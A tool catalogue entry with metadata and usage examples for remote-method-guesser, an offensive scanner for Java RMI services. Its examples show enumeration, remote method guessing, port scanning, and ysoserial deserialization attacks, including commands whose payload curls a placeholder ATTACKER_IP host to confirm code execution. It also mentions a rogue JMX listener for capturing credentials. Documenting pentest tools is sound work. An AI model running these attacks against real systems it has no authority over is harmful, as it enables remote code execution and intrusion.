---
name: "remote-method-guesser"
categories:
  - blackarch-scanner
version: "v5.1.0.r11.g3398ec6"
homepage: "https://github.com/qtc-de/remote-method-guesser"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-28"
build-system: java
license: GPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "qtc-de/remote-method-guesser"
github-stars: 938
github-pushed: "2026-09-03"
github-archived: false
github-issues: 4
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# remote-method-guesser

> Java RMI vulnerability scanner: enumerates RMI endpoints, guesses remote methods, and verifies deserialization, remote-class-loading and registry attacks.

## What it's for

The standard offensive toolkit for Java RMI endpoints (`rmg`). It enumerates
what an RMI registry exposes (bound names, remote classes, endpoints, ObjIDs),
checks the endpoint's security configuration (codebase handling,
`useCodebaseOnly`, serialization behavior), guesses existing remote methods by
sending method hashes from a wordlist, and then verifies attacks you would
otherwise drive by hand: deserialization gadgets against RMI internals or
application objects, remote class loading, and registry manipulation via
bind/rebind/unbind. Extras include a quick RMI port scanner, an embedded
ysoserial JRMP listener wrapper, and a rogue JMX listener for credential
capture. It needs the target's RMI port(s) and, for codebase attacks, an HTTP
server you control; use it wherever a port scan shows services speaking RMI
(JBoss, Solr, Tomcat-style stacks, custom Java services).

## Typical use cases

### Enumerate an RMI endpoint

Map everything a known RMI service exposes in one shot.

```
rmg enum 198.51.100.10 9010
```

Outcome: prints registry bound names with their remote classes, endpoints and
ObjIDs, the server's `java.rmi.server.codebase`, String unmarshalling and
`useCodebaseOnly` behavior, and the security-manager/configuration status —
together these decide which of the attack actions below are viable.

### Guess existing remote methods

Discover callable methods that are not advertised by the interface.

```
rmg guess 198.51.100.10 9010
```

Outcome: sends method hashes from the built-in wordlist (several hundred method
definitions parsed) against each bound name and lists methods that exist on the
remote object; zero-argument methods are skipped by default to avoid real
invocations (`--zero-arg` enables them, custom wordlists via
`--wordlist-file`). Successful guesses are directly usable with `rmg call` and
a `--signature`.

### Find RMI services without a full port scan

Check only the ports that commonly carry RMI when you already suspect a Java
stack.

```
rmg scan 198.51.100.10
```

Outcome: a fast scan of roughly a hundred common RMI ports, printing `[HIT]`
lines like `Found RMI service(s) on 198.51.100.10:9010 (Registry, Activator,
DGC)` with the RMI components detected on each open port — feed these
host:port pairs into `rmg enum`.

### Verify a deserialization attack on RMI internals

Test whether RMI components accept a ysoserial gadget.

```
rmg serial 198.51.100.10 9010 CommonsCollections6 'curl http://ATTACKER_IP:8000/pwned' --component reg
```

Outcome: builds the ysoserial payload and pushes it at the chosen component
(`reg` registry, `dgc`, `act` Activator, or a bound name for application
level); a resulting `ClassCastException` during the attack usually indicates
the payload was processed. A matching callback on your side confirms
execution.

### Serve deserialization payloads to inbound RMI connections

Host a malicious JRMP listener for servers or other clients that dial out.

```
rmg listen 0.0.0.0 4444 CommonsCollections6 'curl http://ATTACKER_IP:8000/pwned'
```

Outcome: wraps ysoserial's JRMPListener — anything connecting to port 4444
speaking RMI receives the gadget payload; combine with `rmg bind`/`rebind` to
point a registry's entry at this listener, or use it to catch DGC callbacks
from a server you poked.

*No corpus evidence — derived from upstream documentation (qtc-de
remote-method-guesser README, its `rmg -h` action list and documented example
invocations).*
